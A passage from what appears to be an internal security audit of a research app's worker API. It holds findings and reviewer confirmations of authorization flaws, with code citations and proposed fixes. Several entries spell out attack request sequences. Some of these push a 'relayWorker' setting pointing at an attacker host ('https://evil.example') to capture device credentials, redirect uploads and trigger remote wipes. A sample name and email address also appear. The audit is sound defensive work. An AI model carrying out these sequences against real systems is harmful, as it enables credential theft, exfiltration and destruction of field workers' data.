      "attack": "1) Researcher A signs in (any approved \u2014 or even still-pending \u2014 account; A need not be a member of anything). 2) `GET /v1/instances/<uuid>` with A's session and NO `x-fx-install` header. A random UUID returns 404 `{\"error\":\"not_found\"}`. 3) The same call against a real instance id belonging to owner O returns 403 `{\"error\":\"forbidden\"}` if it is live, or 410 `{\"error\":\"revoked\"}` if O has revoked it. A therefore learns, for any id they hold (e.g. one seen while previously a member of O's project, or leaked in a support screenshot/invite link), whether the device still exists, and whether it has since been revoked \u2014 with no grant of any kind. 4) Confirm the guard is blind: run `bash ./check-project-scoping.sh` \u2014 it prints `ok    no route under /v1/instances/<id> resolves auth with authResearcher` and exits 0.",
      "evidence": "worker/src/v1.js:4406-4409 \u2014 `let asResearcher = null;` / `let install = null;` / `if (installId) install = await authInstall(request, env, instanceId, installId);` / `else asResearcher = await authResearcher(request, env);`\nworker/src/v1.js:4432-4436 \u2014 `const inst = await env.DB.prepare('SELECT desired_blob, desired_rev, type, revoked, researcher_id FROM instance WHERE instance_id=?')` / `.bind(instanceId).first();` / `if (!inst) return j({ error: 'not_found' }, 404, origin, env);` / `if (inst.revoked) return j({ error: 'revoked' }, 410, origin, env);` / `if (asResearcher && inst.researcher_id !== asResearcher.researcher_id) return j({ error: 'forbidden' }, 403, origin, env);`\ncheck-project-scoping.sh \u2014 `hits=$(awk -v s=\"$start\" 'NR>s && NR<s+700 && /const r = await authResearcher/' \"$W\" | wc -l | tr -d ' ')` with `start=3598` (`grep -n '^  // Routes under /v1/instances/<id>/\\.\\.\\.'` \u2192 3598), so the scan ends at 4298 and the pattern `const r = await authResearcher` does not match `asResearcher = await authResearcher`."
    },
    {
      "title": "`triggerUpload` is text-scoped but was left out of TEXT_COMMANDS, so the command lane is not closed for manageDevices",
      "severity": "low",
      "file": "worker/src/v1.js",
      "line": 3679,
      "claim": "The new command gate lists `TEXT_COMMANDS = ['assign','delete','uploadDelete','setDone']` and its comment asserts \"four of the six command types operate on a TEXT\" and that \"with assignTexts refused in v1 it closes the lane entirely\". Both are wrong by one: `triggerUpload` is also addressed by a doc id (`docs/js/app.js` dispatches it as `const docId = cmd.docId || cmd.id;` and then uploads that text), so FIVE of the six operate on a text and only `changeSettings` is genuinely device-scoped. `triggerUpload` therefore remains reachable on `manageDevices` alone, which is precisely the shape the gate was added to remove \u2014 the audit's own reasoning was that `delete` and `setDone` were included \"because leaving them would keep the hole open under a different name\". The consequence is bounded (the upload lands in the owner's own Drive and `docInScope` refuses out-of-scope docs), so this is a scoping/consistency defect rather than an exfiltration one: a member the owner deliberately withheld the text lane from can still make a field device spend metered mobile data uploading a chosen text, repeatedly, on the member's schedule.",
      "attack": "Owner O adds researcher M to project P with `caps:{\"manageDevices\":true}` and deliberately no assignTexts (which validateCaps would refuse anyway). M sends `POST /v1/instances/<D>/command` with `{\"command\":{\"type\":\"triggerUpload\",\"docId\":\"<a docId M knows>\"}}`. authMember passes on manageDevices; `TEXT_COMMANDS.includes('triggerUpload')` is false at v1.js:3680, so the assignTexts gate never fires; the command is queued with `by: M` and delivered to the field device on its next poll, which uploads that text. The identical call with `\"type\":\"delete\"` is refused with 404. (Precondition: M must know a docId \u2014 the same precondition the four gated types carry, which is why leaving this one ungated is inconsistent rather than harmless.)",
      "evidence": "worker/src/v1.js:3663 \u2014 `if (!['assign', 'delete', 'changeSettings', 'triggerUpload', 'uploadDelete', 'setDone'].includes(cmd.type)) return j({ error: 'unknown_command' }, 400, origin, env);`\nworker/src/v1.js:3665-3666 (the gate's own claim) \u2014 `* manageDevices because queueing a command IS device management \u2014 but four of the six command` / `* types operate on a TEXT, and one of them (\\`delete\\`) destroys a field worker's transcription.`\nworker/src/v1.js:3679-3681 \u2014 `const TEXT_COMMANDS = ['assign', 'delete', 'uploadDelete', 'setDone'];` / `if (TEXT_COMMANDS.includes(cmd.type) && !ctx.isOwner && !ctx.caps.assignTexts) {` / `return j({ error: 'not_found' }, 404, origin, env);`\ndocs/js/app.js:3884-3886 (the device end, showing it is text-addressed) \u2014 `case 'triggerUpload': {` / `const docId = cmd.docId || cmd.id;` / `if (!docId) break;`"
    },
    {
      "title": "`cancelOthers` is accepted and stored by validateCaps but read by no code path \u2014 the exact \"silently grants nothing\" failure the same function refuses assignTexts to avoid",
      "severity": "low",
      "file": "worker/src/v1.js",
      "line": 514,
      "claim": "validateCaps accepts, normalises and stores `cancelOthers`, and the members route echoes it back to the owner in the 200 body and in `GET /v1/projects/<id>/members`. No route anywhere reads `caps.cancelOthers`: the only place it could apply, `POST /v1/instances/<id>/command/cancel`, is gated on `manageDevices` (v1.js:3747) and its comment says so outright. So an owner can tick the capability, be told it was granted, and have granted nothing \u2014 which is the precise failure mode this same function's own comments cite twice as the reason `assignTexts`, `drive`, `see` and `wipe` are REFUSED rather than dropped (\"An owner who ticks 'can assign texts' and is quietly given nothing believes their assistant has access they do not have, and nothing will tell them otherwise until it matters\"). The remediation moved two names into DEFERRED_CAPS and left a third unimplemented name in the accept list. Because every capability denial answers `not_found`, neither party can diagnose it: the owner sees the grant listed and the member sees a response indistinguishable from \"no such device\".",
      "attack": "1) Owner O: `POST /v1/projects/P/members {\"researcher_id\":\"M\",\"caps\":{\"cancelOthers\":true}}` \u2192 200 `{\"ok\":true,\"researcher_id\":\"M\",\"caps\":{\"cancelOthers\":true}}`. `GET /v1/projects/P/members` lists M with `caps:{cancelOthers:true}`. 2) M: `POST /v1/instances/<D>/command/cancel {\"seq\":3}` \u2192 authMember(..., 'manageDevices') finds `caps.manageDevices` undefined and returns `{ok:false}`, so the route answers 404 `{\"error\":\"not_found\"}`. 3) Compare with `{\"caps\":{\"assignTexts\":true}}`, which is correctly refused at the write with 400 `bad_caps`. The two behave oppositely for the same underlying reason.",
      "evidence": "worker/src/v1.js:514-518 \u2014 `for (const k of ['manageDevices', 'createInvites', 'cancelOthers']) {` / `if (raw[k] === undefined) continue;` / `if (typeof raw[k] !== 'boolean') return null;` / `if (raw[k]) out[k] = true;` / `}`\nworker/src/v1.js:3747 (the only route it could gate) \u2014 `const ctx = await authMember(request, env, { instance: instanceId }, 'manageDevices');`, under the comment at 3738-3746: `* \u26a0 GATED ON manageDevices FOR NOW, NOT ON \\`cancelOthers\\`` \u2026 `* it becomes the fallback for authorless commands once \\`cancelOthers\\` lands.`\n`grep -n cancelOthers worker/src/v1.js` returns only 514, 523, 567, 3705, 3738, 3740, 3746 \u2014 the two validateCaps lists and five comment lines. No read of `caps.cancelOthers` exists.\nworker/src/v1.js:501-503 (the rule this breaks) \u2014 `* \u26a0 REFUSED, NEVER SILENTLY DROPPED \u2014 the same rule as \\`see\\` and \\`wipe\\` below. An owner who ticks` / `* \"can assign texts\" and is quietly given nothing believes their assistant has access they do not` / `* have, and nothing will tell them otherwise until it matters.`"
    },
    {
      "title": "GET /v1/projects hands every member the owner's display name or e-mail local-part inside `project.name`, contradicting the route's own \"never the owner's email or display name\" guarantee",
      "severity": "low",
      "file": "worker/src/v1.js",
      "line": 2470,
      "claim": "`GET /v1/projects` returns `joined[].name` to any member of a project, under a comment stating \"A joined project carries its NAME and its owner's opaque id \u2014 never the owner's email or display name.\" But the default project's name is DERIVED from exactly those fields: `defaultProjectName(row)` builds \"`<display_name>`'s project\", falling back to the local-part of `drive_email`. That name is written into `project.name` by the backfill AND used to name the Drive folder, so `reconcileProjects` keeps re-affirming it \u2014 it persists until the researcher explicitly renames the project. Since the lazy mint on `GET /v1/researcher` runs `backfillProjectsFor` for every researcher who has no project row, this is the DEFAULT state, not an edge case. The invariant \"Identity is not advertised: no email or display name in cross-researcher lookups\" is why members are addressed by opaque researcher_id and why `GET /v1/researcher/pubkey/<id>` deliberately returns the key and nothing else; this route re-opens the same disclosure through a field nobody thought of as identity.",
      "attack": "1) Owner O signs in with Google as \"Seth Johnston <sethtjohnston@gmail.com>\" and has never renamed their project. `GET /v1/researcher` lazily mints it: `backfillProjectsFor` inserts `project.name = defaultProjectName(row)` = \"Seth Johnston's project\" (or \"sethtjohnston's project\" when `display_name` is empty), and `driveEnsureDefaultProject(access, defaultProjectName(row))` gives the Drive folder the same name, so `reconcileProjects` re-writes it rather than correcting it. 2) O adds member M by opaque researcher_id: `POST /v1/projects/P/members {\"researcher_id\":\"M\",\"caps\":{\"manageDevices\":true}}`. 3) M calls `GET /v1/projects` and receives `joined:[{project_id:\"P\", name:\"Seth Johnston's project\", owner_id:\"<uuid>\", caps:{...}}]` \u2014 O's real name (or e-mail local-part), disclosed by the API rather than by O choosing to disclose it.",
      "evidence": "worker/src/v1.js:1721-1724 \u2014 `function defaultProjectName(row) {` / `const who = (row.display_name || '').trim() || (row.drive_email || '').split('@')[0] || 'Project';` / `return \\`${who}'s project\\`.slice(0, 120);` / `}`\nworker/src/v1.js:1736 \u2014 `.bind(project_id, row.researcher_id, defaultProjectName(row), now).run();`\nworker/src/v1.js:1755 \u2014 `driveFolder = await driveEnsureDefaultProject(access, defaultProjectName(row));` (so the Drive folder carries the same name and reconcileProjects' name sync at v1.js:1834-1836 re-affirms it rather than replacing it)\nworker/src/v1.js:2449-2450 (the claim) \u2014 `* \u26a0 IDENTITY IS NOT ADVERTISED HERE EITHER. A joined project carries its NAME and its owner's` / `* opaque id \u2014 never the owner's email or display name.`\nworker/src/v1.js:2470 (the disclosure) \u2014 `return { project_id: x.project_id, name: x.name, owner_id: x.owner_id, caps, invalid: caps === null };`\nworker/src/v1.js:2705-2707 (why it is the default state) \u2014 `const mine = await env.DB.prepare('SELECT project_id FROM project WHERE owner_id=? LIMIT 1')` / `.bind(r.researcher_id).first();` / `if (!mine) await backfillProjectsFor(env, r, now);`"
    }
  ]
}
```

## a66747dcec4ba733b

```json
{
  "refuted": false,
  "reasoning": "Traced the whole chain in the current code; every quoted line is accurate and no guard intervenes.\n\nWORKER: v1.js:3653 gates POST /v1/instances/<id>/command on authMember(..., 'manageDevices') \u2014 a capability validateCaps (505-520) explicitly still grants members. v1.js:3663 is the ONLY validation of the command object (a type allowlist containing 'changeSettings'); cmd.settings is never inspected. The remediation gate at 3679-3682 (TEXT_COMMANDS = assign/delete/uploadDelete/setDone) does not include changeSettings, so it never fires. 3712 pushes `{ ...cmd, seq, at, by }` \u2014 the caller's settings object verbatim into desired_blob.\n\nDEVICE: app.js:3841-3846 merges with `Object.assign(s, cmd.settings || {})` \u2014 no key allowlist \u2014 then saveSettings + applyLiveSettings, and applyLiveSettings (3736-3739) does `settings = loadSettings()`, so it takes effect live. workerBase() (147-150) returns settings.relayWorker when set; Sync.start passes `workerBase: () => workerBase()` (7839), and sync.js resolves it PER REQUEST at 223/88, sending installHeaders (x-fx-install/x-fx-secret, 92/253) to the pushed host. sync.js:440 `let cmd = c; if (c.enc) {...}` dispatches a plaintext command as-is, so the pusher needs no Ki. sync.js:406 honours `r.wipe` from the poll body before every gate \u2192 wipeThisDevice \u2192 iface.eraseAllData (392).\n\nREFUTATION ATTEMPTS THAT FAILED: (1) No CSP/connect-src anywhere in docs/, apps/, paragraph-analysis/ (grepped HTML, toml, _headers, js) \u2014 nothing restricts the fetch destination. (2) No server-side settings allowlist: 'changeSettings' appears in the worker only at v1.js:3663. (3) No device-side sanitisation of pushed keys. (4) Not a designed pushable key: the panel's readForm (researcher-panel.js:6253-6279) builds its patch from GROUPS form fields plus a fixed SPECIAL list and never includes relayWorker; app.js:3842-3843's own comment treats relayWorker as a local power-user value the push must not disturb \u2014 a merge sets it, which is the bug. (5) Reachability of the target id: GET /v1/researcher (2740) lists instances by researcher_id only, so a member does not see them there, but GET /v1/researcher/keys (2362-2372) is scoped by researcher_id alone and returns instance_id for every grant the owner shared \u2014 the designed member flow \u2014 so the id is obtainable exactly as the attack describes. (6) The invariant it breaks is real and still enforced elsewhere: the wipe route IS owner-only (v1.js:4176-4178, `if (!ctx.ok || !ctx.isOwner) return not_found`) and check-project-scoping.sh:96-98 asserts no capability may delegate it \u2014 yet a hostile backend reached via relayWorker answers `{\"wipe\":true}` and destroys the device's work, delegating exactly that.\n\nThe request sequence is concrete and performable: add member with {\"manageDevices\":true} (accepted), POST /v1/instances/<id>/command {\"command\":{\"type\":\"changeSettings\",\"settings\":{\"relayWorker\":\"https://evil.example\"}}} (200), device applies on next poll, subsequent polls/reports/uploads go to the attacker with install credentials, and the attacker's poll response can wipe it.",
  "correction": "Confirmed, with one qualification to consequence (b). The redirected uploads are of a device inside the member's OWN project, so this is not a cross-project read of corpus data; what it actually is, is (i) project data leaving the owner's Drive/worker to an arbitrary attacker-controlled host, (ii) capture of the device's install credentials (usable against the REAL worker for report/upload/wipe-ack), and (iii) \u2014 the sharpest part \u2014 a transitive remote wipe, which v1.js:4176-4178 and check-project-scoping.sh:96-98 declare owner-only and undelegatable. The root cause is precisely as stated: POST /v1/instances/<id>/command validates only cmd.type (v1.js:3663) while the device merges cmd.settings with no allowlist (app.js:3845), and relayWorker is the base URL of every worker call (app.js:147-150 \u2192 sync.js:88/223). Also note the finding's aside that 'triggerUpload' is \"deliberately outside the gate\" is an inference, not something the code states; it does not affect the substance."
}
```

## ae5bebf2f5a71a679

```json
{
  "refuted": false,
  "reasoning": "CONFIRMED \u2014 I traced every link myself and found no guard that stops it.\n\n**Worker side (worker/src/v1.js).** The command route resolves auth at 3653: `const ctx = await authMember(request, env, { instance: instanceId }, 'manageDevices');`. The ONLY validation of the command payload is the type allowlist at 3663: `if (!['assign','delete','changeSettings','triggerUpload','uploadDelete','setDone'].includes(cmd.type)) return j({error:'unknown_command'},400,\u2026)`. `cmd.settings` is never inspected, never key-filtered, and is stored verbatim at 3713: `blob.commands.push({ ...cmd, seq, at: now, by: ctx.caller.researcher_id });`. The remediation gate is at 3679-3681 \u2014 `const TEXT_COMMANDS = ['assign','delete','uploadDelete','setDone'];` / `if (TEXT_COMMANDS.includes(cmd.type) && !ctx.isOwner && !ctx.caps.assignTexts) return not_found` \u2014 and `changeSettings` is deliberately outside it. The device-poll route returns the blob unfiltered (4453: `\u2026 settings: blob.settings || {}, commands: blob.commands || [] \u2026`).\n\n**authMember passes a member here.** For a project-stamped instance it reads `project_id` off the instance row, finds the caller's `project_member` row, and `if (!caps[want]) return deny` \u2014 `manageDevices` is exactly the capability `validateCaps` still grants (only `assignTexts`/`drive` are in DEFERRED_CAPS). No per-device narrowing exists (\"NO PER-DEVICE CHECK HERE \u2014 see validateCaps\").\n\n**Device side.** `syncDispatch` case `'changeSettings'` (docs/js/app.js:3844-3845) is `const s = loadSettings(); Object.assign(s, cmd.settings || {});` \u2014 an unfiltered merge of arbitrary keys, then `saveSettings(s); applyLiveSettings();`, and `applyLiveSettings` re-reads module state (`settings = loadSettings();`, app.js:3738), so the change is live without a reload. `workerBase()` (app.js:147-150) is `const explicit = (settings.relayWorker || '').trim(); return explicit || (isLocalDev() ? LOCAL_WORKER : DEFAULT_WORKER);`, and it is injected into the sync engine at app.js:7839 (`workerBase: () => workerBase(),`). Every `/v1/` call goes through `sync.js` `v1()` (`const base = (iface.workerBase() || '')\u2026; fetch(base + path, \u2026)`) carrying `installHeaders(s)` = `{'x-fx-install': s.installId, 'x-fx-secret': s.installSecret}`, and `workerUploadTarget()` builds the upload URL off the same base with the same headers.\n\n**The escalation is real and is one the design explicitly withholds.** `sync.js:406` \u2014 `if (r.wipe) { await wipeThisDevice(s); return; } // REMOTE WIPE \u2014 top priority, any state, before every gate` \u2014 and `wipeThisDevice` calls `iface.eraseAllData()`, wired at app.js:7865 as \"remote-wipe directive \u2192 full local nuke\". The real wipe route (v1.js:4172-4178) is `authMember(\u2026, null)` + `if (!ctx.ok || !ctx.isOwner) return not_found`, plus a TOTP step-up; `check-project-scoping.sh` has a dedicated assertion that it keeps checking `ctx.isOwner` (\"a capability must never delegate destroying a device's work in v1\"). A member with `manageDevices` repointing `relayWorker` reaches the same outcome with neither ownership nor TOTP. Plaintext works: `sync.js:441` only decrypts `if (c.enc)`, otherwise dispatches `c` as-is, so no Ki grant is needed to push the command.\n\n**Refutation attempts that failed.** (1) No server-side settings allowlist exists anywhere in the route or a helper. (2) The client has no pushed-settings key filter \u2014 the only sanitized `relayWorker` writer is `?devworker`, which accepts fixed constants (app.js:208-209). (3) The instance id is obtainable: `GET /v1/researcher/keys` (v1.js:2362-2371) is scoped by `researcher_id` alone and lists `instance_id`s the caller holds grants for \u2014 and in any case knowing device ids is the point of `manageDevices`. (4) It is not pre-existing: this route was owner-only before the authMember conversion. (5) It is not one of the 17 \u2014 the audit's only command-lane finding is the `assign`/`uploadDelete` capability-bypass (plans/AUDIT-FINDINGS-2026-08-21.md:357), already closed by the TEXT_COMMANDS gate; `relayWorker`/`changeSettings` appears nowhere in that document. It is precisely a case where the deferral's stated dividing line (\"EVERY dangerous route is one where the member names a Drive file or text\") does not hold: no Drive id is involved at any step.",
  "correction": "Two refinements to how the finding should be stated, neither of which changes the verdict:\n\n1. Consequence (b), upload redirection, is the weakest of the three because a settings push already legitimately carries the device's Drive destination \u2014 the panel's `readForm` (researcher-panel.js:6254-6278) pushes every group field, and the audit's decided fix explicitly lists \"push settings\" as something a `manageDevices` member may do. The distinctive, indefensible escalations are (a) capture of `x-fx-install`/`x-fx-secret` and (c) member-triggered `eraseAllData`, which bypass a route the code keeps owner-only AND TOTP-gated, and which a shell script guards specifically against capability delegation. Lead with those; (b) is aggravation, not the core.\n\n2. The attack's step 2 (learning the instance id via a Ki grant) is not load-bearing and slightly conflicts with the finding's own closing note that no `member_key` grant is needed. Drop it: a member with `manageDevices` is expected to know the device ids in their project \u2014 that is what the capability is for \u2014 and `GET /v1/researcher/keys` merely confirms an unscoped listing path also exists.\n\n3. Worth adding to the finding: the fake backend also re-opens the TEXT_COMMANDS gate at 3679-3681 from the other side, since the attacker's worker composes the device's entire desired lane and `sync.js:441` dispatches unencrypted commands verbatim \u2014 so `assign`/`delete` become reachable without `assignTexts` once `relayWorker` is repointed. Line 3712 in the evidence should be 3713 (`blob.commands.push(...)`); 3712 is the comment above it."
}
```

## adab86ff41ffbbd42

```json
{
  "refuted": false,
  "reasoning": "CONFIRMED \u2014 traced end to end in the current code, and the regression is visible in the remediation commit itself.\n\n1. The sweep, v1.js:2576-2579, resolves grants ONLY through the current instance row:\n   'DELETE FROM member_key WHERE researcher_id=? AND instance_id IN (SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))'\n   Neither clause matches an instance whose project_id is now B when the removal names A.\n\n2. `git show efc42a7 -- worker/src/v1.js` shows the fix REPLACED rather than unioned the old predicate. The deleted line is:\n   -  env.DB.prepare('DELETE FROM member_key WHERE project_id=? AND researcher_id=?').bind(projectId, who),\n   That dropped predicate is exactly what caught a grant minted while the device sat in project A (member_key.project_id snapshot = 'A'). So the moved-device case was covered before the fix and is not covered after it \u2014 a regression, in the direction the commit message itself rules out: \"for a revocation the safe direction is to remove too much rather than too little. Re-granting is one call; a key that should have been withdrawn and was not cannot be recalled at all.\" This is squarely inside the brief's \"is the remediation itself sound \u2014 the new SQL\".\n\n3. instance.project_id is mutable, and by MORE paths than the finding names. v1.js:3316-3317 (`POST /v1/researcher/projects/assign`) is one; reconcileProjects at v1.js:1864-1871 is the other and is the mundane one \u2014 it recomputes each container's project_id from Drive parentage and writes `UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?` on every panel estate load. Dragging the device folder from project A's folder into project B's folder in Drive produces the same D1 state with no /projects/assign call at all.\n\n4. The attack sequence is performable as written. Device folders are created with NO appProperties (v1.js:1067-1068: `{ name, mimeType: 'application/vnd.google-apps.folder', parents: [parent] }`), so `role` is '' at v1.js:3303 and the `if (role && role !== 'crowd') return not_a_container` gate passes; there is no flextextDoc and the mimeType is a folder. /v1/projects/<id>/members is owner-only (v1.js:2485-2488, authMember({project}) + ctx.isOwner), which the sequence assumes.\n\n5. Nothing else removes the row. `grep -n member_key worker/src/v1.js` yields exactly three statements: the grant insert (2345), the owner's explicit per-grant DELETE /v1/researcher/keys (2434/2436), and this sweep (2577). POST /v1/instances/<id>/revoke writes only instance/install revoked flags \u2014 no member_key cleanup. There is no retention sweep.\n\n6. The read path is unguarded, so deletion really is the only control: v1.js:2364-2372 authenticates with authResearcher and selects `... FROM member_key WHERE researcher_id=?` with no project or membership predicate. M, a member of nothing, is still served instance D's wrapped_ki.\n\n7. The owner is affirmatively misinformed: v1.js:2584 `return j({ ok: true, removed: gone, grants_removed: keys }, 200, ...)` \u2014 ok:true with grants_removed:0.\n\nThis violates the invariant the route's own comment states (v1.js:2481-2483: \"REMOVING A MEMBER ALSO DELETES THEIR KEY GRANTS ... Without that, 'removed' would mean 'no longer listed' while they still hold every wrapped Ki the ledger handed them \u2014 revocation as a UI state rather than an act (invariant I5)\").\n\nRefutation attempts that FAILED: (a) \"already covered by audit finding v1.js:2501, which mentions 'stale for any instance that later moved projects'\" \u2014 that finding described the OLD code's snapshot being stale (remove from B, snapshot says A); the new code fixes that direction and breaks the mirror direction, and the covering predicate was deliberately deleted. It is a residual in the fix, not a restatement of the fixed bug. (b) \"the second clause is deliberately broad enough\" \u2014 it only fires on project_id IS NULL; a moved device has a non-NULL project_id. (c) \"some other cleanup catches it\" \u2014 grep shows none. (d) \"the read path is membership-gated\" \u2014 it is not.",
  "correction": "Two claims in the write-up are overstated and should be trimmed before the fix is scoped; neither affects the defect.\n\n(1) \"There is no route the owner can call to notice or fix this except knowing to issue DELETE /v1/researcher/keys\" is not quite right. The batch's two statements are independent, so an owner who knows D moved to B can call DELETE /v1/projects/<B>/members {\"researcher_id\":\"M\"} even though M is not a member of B: statement 1 deletes 0 project_member rows, statement 2's subquery finds D (project_id='B') and deletes the grant, answering {ok:true, removed:0, grants_removed:1}. Nothing in the removal-from-A response points the owner there, so the practical situation is unchanged, but the recovery path exists.\n\n(2) The impact should be stated narrowly. With the capability deferral, M after removal is a member of nothing, so every authMember-gated route denies and the worker will not serve M any NEW instance ciphertext. The concrete, evidenced defect is therefore: the worker keeps handing over a wrapped Ki it was asked to withdraw (GET /v1/researcher/keys, v1.js:2364-2372), the owner is told the withdrawal succeeded (grants_removed:0 with ok:true, v1.js:2584), and anything M already cached \u2014 or later obtains out of band, e.g. through Drive folder sharing \u2014 stays decryptable. \"Can decrypt D's reports and commands\" is true only of material M can still reach, not of live worker responses.\n\nAlso add the second mutation path to the evidence: reconcileProjects, worker/src/v1.js:1864-1871, `UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?`, runs on every panel estate load and restamps project_id from Drive parentage \u2014 so the precondition is reached by an ordinary Drive drag, not only by POST /v1/researcher/projects/assign.\n\nMinimal fix consistent with the commit's own doctrine: union the dropped predicate back in rather than choosing between them, e.g.\n  DELETE FROM member_key WHERE researcher_id=? AND (project_id=? OR instance_id IN (SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?)))\nwhich catches both the snapshot-at-grant-time project and the device's current project. Separately, consider sweeping grants when an instance changes project (assign + reconcileProjects), since the grant becomes illegitimate at the moment of the move, not at the moment of removal."
}
```

## aa6e29f02c0379774

```json
{
  "refuted": false,
  "reasoning": "CONFIRMED \u2014 every quoted line is accurate in the current code on `claude/cut-tab-waveform-displays-2owdfx`, and each link of the chain reproduces. I checked the five things that could have refuted it and none do.\n\nWHAT THE CODE ACTUALLY SAYS\n\n1. Route reachable by a member with only `manageDevices`:\n   worker/src/v1.js:3653 `const ctx = await authMember(request, env, { instance: instanceId }, 'manageDevices');`\n   authMember (v1.js:569-686) resolves project_id off `instance`, then v1.js:681 `} else if (!caps[want]) { return deny; }` \u2014 `{\"manageDevices\":true}` passes. validateCaps (v1.js:511-518) refuses only `assignTexts`/`drive`, so this cap is grantable today.\n\n2. The ONLY validation of the command body:\n   v1.js:3661 `if (!cmd || typeof cmd.type !== 'string') \u2026`\n   v1.js:3663 `if (!['assign','delete','changeSettings','triggerUpload','uploadDelete','setDone'].includes(cmd.type)) \u2026`\n   v1.js:3680-3682 `const TEXT_COMMANDS = ['assign','delete','uploadDelete','setDone']; if (TEXT_COMMANDS.includes(cmd.type) && !ctx.isOwner && !ctx.caps.assignTexts) \u2026` \u2014 `changeSettings` is deliberately outside that gate.\n   v1.js:3712 `blob.commands.push({ ...cmd, seq, at: now, by: ctx.caller.researcher_id });` \u2014 `cmd.settings` is never inspected, never key-filtered, stored verbatim. I grepped the whole worker: there is no other sanitizer of a settings blob on this path.\n\n3. No Ki needed: the legitimate panel path is researcher.js:568-569 `const Ki = await getKi(instanceId); const command = { type, enc: await encryptJSON(Ki, payload) };` \u2014 but the worker does not require `enc`, and the device dispatches a plaintext command as-is: sync.js:440-445 `let cmd = c; if (c.enc) {\u2026} try { await iface.dispatch(cmd); }`.\n\n4. Device merges every key, live: app.js:3844-3845 `const s = loadSettings(); Object.assign(s, cmd.settings || {});` then `applyLiveSettings()`, which at app.js:3739 does `settings = loadSettings();` (it returns early only for RESEARCHER_MODE, not a field device). `relayWorker` is exactly what the backend origin is read from: app.js:147-149 `function workerBase() { const explicit = (settings.relayWorker || '').trim(); return explicit || \u2026; }` \u2014 no host allowlist anywhere, and there is no CSP `connect-src` in `docs/index.html` or any satellite shell (grepped; none exists) to stop the cross-origin fetch.\n\n5. Consequences all land on live code paths:\n   - credentials: sync.js:221-225 `const base = (iface.workerBase() || '')\u2026 fetch(base + path, \u2026)` with sync.js:253 `installHeaders(s) { return { 'x-fx-install': s.installId, 'x-fx-secret': s.installSecret }; }` \u2014 the install secret is sent to whatever origin was pushed. app.js:7839 confirms the injected `workerBase: () => workerBase()`.\n   - exfiltration: sync.js:87-92 `workerUploadTarget()` builds the upload URL from the same `iface.workerBase()`, headers carrying install+secret; app.js wires it via `setWorkerUploadTarget(() => Sync.workerUploadTarget())`.\n   - wipe: sync.js:406 `if (r.wipe) { await wipeThisDevice(s); return; } // REMOTE WIPE \u2014 top priority, any state, before every gate` \u2192 sync.js:392 `if (iface && iface.eraseAllData) await iface.eraseAllData();`, provided at app.js:7865, and app.js:7618-7641 deletes `flextext-editor` (the corpus) FIRST. `r` is plain JSON from the (now attacker-controlled) poll \u2014 nothing about it is authenticated or signed.\n\nWHY THIS IS A REAL RULE VIOLATION, NOT INTENDED BEHAVIOUR\nThe genuine wipe route is v1.js:4172-4180: `const ctx = await authMember(request, env, { instance: instanceId }, null); if (!ctx.ok || !ctx.isOwner) return not_found;` plus a TOTP step-up, commented \"OWNER-ONLY in v1 (round-1 finding 6) \u2026 no capability delegates that yet\", and check-project-scoping.sh has a dedicated guard for it. The changeSettings passthrough delegates that destructive power to `manageDevices`, with no ownership check and no 2FA. It also puts a field worker's recordings and .flextext bundles on an origin outside the project \u2014 violating project scoping \u2014 without naming any Drive id, which is precisely the line validateCaps' comment (v1.js:495-497, \"EVERY safe route works only from D1, or from the device's own stored oauth_folder_id\") claims cannot be crossed by a shipped capability. And it re-opens the lane the TEXT_COMMANDS gate closed, since a rogue backend serves its own `assign`/`delete` commands.\nNothing in the code treats `relayWorker` as privileged; the only comment mentioning it (app.js:3842-3843) worries about *preserving* a power-user's value, not about a member *setting* one \u2014 so this is an oversight, not a decision.\n\nREFUTATION ATTEMPTS THAT FAILED\n- No server-side settings-key allowlist exists (grepped worker/src for every write to desired_blob).\n- No client-side allowlist: the merge is unconditional.\n- No CSP / worker-host pinning; the session stores no base URL \u2014 `v1()` recomputes it from the live setting every request.\n- The device is not blocked by the E2EE gate: it holds Ki normally, and the attacker's command needs none.\n- The audit doc mentions `changeSettings` only once (line 370) as part of the quoted type list in the `assign`/`uploadDelete` finding; the decided fix even lists \"push settings\" as an intended member power \u2014 the settings *payload* was never examined. So this is not a re-report of the 17.\n\nMINOR CORRECTIONS TO THE CLAIM (do not change the verdict)\n- Instance discovery: the claim's route is right (v1.js:2362-2371, `GET /v1/researcher/keys` with no `instance` param returns every `member_key` row for the caller, instance_id included), but the Ki grant is not required for the attack itself \u2014 any known instance_id works, since the plaintext command needs no key. Note the member does NOT get device ids from the dashboard: v1.js:2740 lists `FROM instance WHERE researcher_id=?` (caller's own only).\n- The upload-exfiltration step requires the device to be accepted/approved (sync.js:89 `if (!s || !s.instanceId || !s.accepted || s.status !== 'approved') return null;`), which an enrolled field device is.\n\nSUGGESTED SHAPE OF FIX (not a finding, just to keep the \"fix causes a real bug\" risk down): allowlist the pushable settings keys server-side at v1.js:3663 (and mirror it in app.js:3845), explicitly excluding `relayWorker` and any other backend/origin-bearing key. Do not simply drop unknown keys silently on the device \u2014 the panel pushes real field settings, so the worker must reject an unknown key with a 400 rather than the device dropping it, or an owner will believe a setting landed when it did not."
}
```

## a01d2dcdfa3ea93e0

```json
{
  "refuted": false,
  "reasoning": "CONFIRMED \u2014 every quoted line is verbatim in the current code, and the sequence is performable end to end with ordinary owner API calls plus the ex-member's own credentials.\n\nCode verified (worker/src/v1.js, current HEAD of claude/cut-tab-waveform-displays-2owdfx):\n\n1) v1.js:2574-2585, DELETE /v1/projects/<id>/members:\n   `env.DB.prepare(\n      'DELETE FROM member_key WHERE researcher_id=? AND instance_id IN ('\n      + 'SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))'\n    ).bind(who, projectId, ctx.owner.researcher_id)`\n   followed by `return j({ ok: true, removed: gone, grants_removed: keys }, 200, origin, env);`\n   The batch has exactly two statements \u2014 there is no other sweep. The subquery matches only instances whose CURRENT project_id is the project being removed from, or NULL-and-owned-by-this-owner.\n\n2) `instance.project_id` is mutable and is rewritten by ordinary owner actions, so a grant minted while the device was in A is not matched by a removal from A once the device sits in B:\n   - v1.js:3315-3319 (POST /v1/researcher/projects/assign): `UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?` with `newPid = destRow ? destRow.project_id : null`. The route's own comment (3272-3276) says this update is REQUIRED because \"Phase C authorizes from 